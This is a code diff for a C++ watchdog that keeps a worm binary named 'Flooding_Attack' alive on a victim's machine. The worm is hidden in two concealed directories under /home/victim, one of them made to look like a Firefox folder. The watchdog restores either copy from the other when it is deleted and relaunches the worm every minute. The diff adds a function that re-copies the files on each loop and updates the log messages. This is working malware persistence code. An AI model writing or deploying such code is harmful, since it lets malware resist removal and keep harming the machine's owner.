@@ -21,11 +21,29 @@
 #define LOCATION_A "/home/victim/.etc/.module/Flooding_Attack"
 #define LOCATION_B "/home/victim/.firefox/.module/Flooding_Attack"
 
+bool hasFileAt(const char* path) {
+    struct stat buffer;
+    return stat(path, &buffer) == 0;
+}
+
 // Copy a file from srcpath to dstpath.
 bool copyFile(const char* srcpath, const char* dstpath) {
     std::ifstream src(srcpath, std::ios::binary);
     std::ofstream dst(dstpath, std::ios::binary);
     dst << src.rdbuf();
+}
+
+// Gaurentees that worm bin files are put at two locations.
+bool requireTwoWormDistributed() {
+    if (hasFileAt(LOCATION_A)) {
+        if (!hasFileAt(LOCATION_B)) copyFile(LOCATION_A, LOCATION_B);
+        return true;
+    }
+    if (hasFileAt(LOCATION_B)) {
+        copyFile(LOCATION_B, LOCATION_A);
+        return true;
+    }
+    return false;
 }
 
 // Queires if the program is running by given PID.
@@ -37,15 +55,8 @@ bool isWormRunning(pid_t pid) {
 // Queries any location the worm binary is repalced. If no bin file exists,
 // return empty string.
 std::string isWormDistributed() {
-    struct stat buffer;
-    if (stat(LOCATION_A, &buffer) == 0) {
-        if (stat(LOCATION_B, &buffer) != 0) copyFile(LOCATION_A, LOCATION_B);
-        return LOCATION_A;
-    }
-    if (stat(LOCATION_B, &buffer) == 0) {
-        if (stat(LOCATION_A, &buffer) != 0) copyFile(LOCATION_B, LOCATION_A);
-        return LOCATION_B;
-    }
+    if (hasFileAt(LOCATION_A)) return LOCATION_A;
+    if (hasFileAt(LOCATION_B)) return LOCATION_B;
     return "";
 }
 
@@ -65,9 +76,15 @@ int main() {
     std::cout << "Timer starts." << std::endl;
     pid_t pid = -1;
     while (1) {
-        std::cout << "Checking the worm with PID " << pid << " ." << std::endl;
+        std::cout << "Checking the worm binary files......" << std::endl;
+        std::cout << (requireTwoWormDistributed()
+                          ? "Worm files exist."
+                          : "Worm files had been deleted.")
+                  << std::endl;
+        std::cout << "Checking the worm with PID " << pid << " ......"
+                  << std::endl;
         if (pid < 0 || !isWormRunning(pid)) {
-            std::cout << "Worm not running. Trying to execute the worm."
+            std::cout << "Worm not running. Trying to execute the worm ......"
                       << std::endl;
             std::string path = isWormDistributed();
             if (path == "") {
@@ -79,9 +96,9 @@ int main() {
                 std::cout << "Failed to execute the worm." << std::endl;
                 break;
             }
-            std::cout << "Worm executed. PID " << pid << " ." << std::endl;
+            std::cout << "Worm executed. PID is " << pid << " ." << std::endl;
         } else {
-            std::cout << "Worm running." << std::endl;
+            std::cout << "The worm is running." << std::endl;
         }
         usleep(MINUTE);
     }
